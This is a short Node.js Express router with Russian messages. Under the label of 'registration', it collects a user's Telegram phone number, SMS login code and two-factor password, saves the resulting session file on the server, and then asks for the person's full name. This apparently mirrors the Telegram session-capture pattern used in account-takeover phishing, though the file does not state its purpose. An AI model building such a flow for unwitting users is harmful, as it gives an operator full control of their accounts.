const express = require('express');
const path = require('path');
const fs = require('fs');
const { authorizeStart, clients } = require('../telegram/authorizeStart');
const { authorizeFinish } = require('../telegram/authorizeFinish');
const sessionsDir = path.resolve(__dirname, '../sessions');

const router = express.Router();

router.post('/start-registration', async (req, res) => {
  const phoneNumber = req.body.phoneNumber;
  const sessionPath = path.join(sessionsDir, `${phoneNumber}.session.json`);
  const sessionExists = fs.existsSync(sessionPath);

  try {
    await authorizeStart(phoneNumber);
    if (sessionExists) {
      return res.render('fullname', {
        message: '✅ Уже авторизован. Введите ФИО.',
        phoneNumber
      });
    }

    res.render('index', {
      message: '📩 Код отправлен! Введите его выше.',
      phoneNumber
    });
  } catch (e) {
    console.error(e);
    res.render('index', {
      message: `❌ Ошибка при запуске клиента: ${e.message}`,
      phoneNumber: null,
    });
  }
});

router.post('/submit-sms-code', async (req, res) => {
  const { smsCode, phoneNumber, password } = req.body;

  try {
    await authorizeFinish(phoneNumber, smsCode, password);
    res.render('fullname', {
      message: 'Авторизация прошла! Теперь введите ФИО.',
      phoneNumber
    });
  } catch (e) {
    if (e.message === 'SESSION_PASSWORD_NEEDED') {
      return res.render('index', {
        message: '🔐 Включена 2FA. Введите пароль.',
        phoneNumber,
        needPassword: true
      });
    }

    console.error(e);
    res.render('index', {
      message: `❌ Ошибка: ${e.message}`,
      phoneNumber,
    });
  }
});

module.exports = router;
